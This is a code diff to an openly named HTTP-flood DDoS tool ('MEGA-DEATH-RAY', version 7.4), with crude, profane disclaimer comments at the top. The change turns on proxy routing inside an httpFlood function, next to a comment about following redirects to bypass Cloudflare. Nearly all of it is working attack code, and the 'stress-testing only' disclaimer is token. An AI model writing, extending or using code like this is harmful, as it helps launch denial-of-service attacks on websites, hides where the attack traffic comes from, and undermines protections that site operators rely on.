@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.3)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.4)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -240,9 +240,20 @@ async function httpFlood(url, hexBytes, proxy) {
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
-            //proxy: proxy, // Use proxy server if provided
+            proxy: proxy, // Use proxy server if provided
         };
+		if (proxy) {
+            const proxyParts = proxy.split(':');
+            if (proxyParts.length === 2) {
+                const proxyHost = proxyParts[0];
+                const proxyPort = parseInt(proxyParts[1]);
 
+                // Check if the proxy is an HTTP proxy
+                if (!isNaN(proxyPort) && proxyPort > 0 && proxyPort <= 65535) {
+					fetchOptions.proxy = `http://${proxyHost}:${proxyPort}`;
+				}
+			}
+		}
         const response = await fetch(url, fetchOptions);
 
         clearTimeout(timeoutId);
